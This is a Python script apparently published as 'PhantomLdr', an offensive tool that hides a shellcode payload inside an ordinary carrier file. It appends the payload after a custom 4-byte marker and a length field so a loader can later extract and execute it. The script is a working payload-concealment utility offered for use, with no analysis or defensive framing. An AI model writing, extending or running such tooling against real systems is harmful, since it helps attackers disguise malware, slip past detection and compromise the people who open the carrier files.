#!/usr/bin/python3

import argparse
import os
import sys
import pyfiglet

class Colors:
    RED     = '\033[31m'
    GREEN   = '\033[32m'
    WHITE   = '\033[37m'
    END     = '\033[39m'

def banner():
    ascii_banner = pyfiglet.figlet_format("PhantomLdr")
    print(f"{Colors.RED}{ascii_banner}{Colors.END}")
    print(f"{Colors.WHITE}Created By Intrusionz3r0{Colors.END}\n")

def is_potentially_sensitive_extension(filename):
    # Evita sobreescribir o modificar archivos ejecutables o críticos
    sensitive_exts = [
        ".exe", ".dll", ".sys", ".bin", ".dat", ".elf", ".so",
        ".dll", ".ocx", ".scr"
    ]
    ext = os.path.splitext(filename)[1].lower()
    return ext in sensitive_exts

def validate_file(path, description):
    if not os.path.isfile(path):
        print(f"{Colors.RED}[!] {description} not found: {path}{Colors.END}")
        sys.exit(1)
    if is_potentially_sensitive_extension(path):
        print(f"{Colors.RED}[!] Warning: {description} has a sensitive extension ({os.path.splitext(path)[1]}). Aborting to prevent corruption.{Colors.END}")
        sys.exit(1)

def embed_shellcode(file_path, shellcode_path, output_path, marker="Z3R0", verbose=False):
    if len(marker) != 4:
        print(f"{Colors.RED}[!] Marker must be exactly 4 characters (4 bytes).{Colors.END}")
        sys.exit(1)

    marker_bytes = marker.encode("ascii")

    with open(file_path, "rb") as f:
        original = f.read()

    with open(shellcode_path, "rb") as f:
        sc = f.read()

    length = len(sc).to_bytes(4, byteorder="little")

    with open(output_path, "wb") as f:
        f.write(original + marker_bytes + length + sc)

    print(f"{Colors.GREEN}[+] File created successfully: {output_path}{Colors.END}")

    if verbose:
        print(f"{Colors.WHITE}[*] Original file size: {len(original)} bytes{Colors.END}")
        print(f"{Colors.WHITE}[*] Shellcode size: {len(sc)} bytes{Colors.END}")
        print(f"{Colors.WHITE}[*] Marker used: {marker_bytes.hex()} ('{marker}'){Colors.END}")

if __name__ == "__main__":
    banner()

    parser = argparse.ArgumentParser(description="Embed shellcode within any non-sensitive file with a custom 4-byte marker")
    parser.add_argument("-i", "--input", required=True, help="Original file path")
    parser.add_argument("-s", "--shellcode", required=True, help="Shellcode path")
    parser.add_argument("-o", "--output", required=True, help="Output file name")
    parser.add_argument("-m", "--marker", default="Z3R0", help="4-byte ASCII marker (default: Z3R0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    validate_file(args.input, "Input file")
    validate_file(args.shellcode, "Shellcode file")

    embed_shellcode(args.input, args.shellcode, args.output, args.marker, args.verbose)
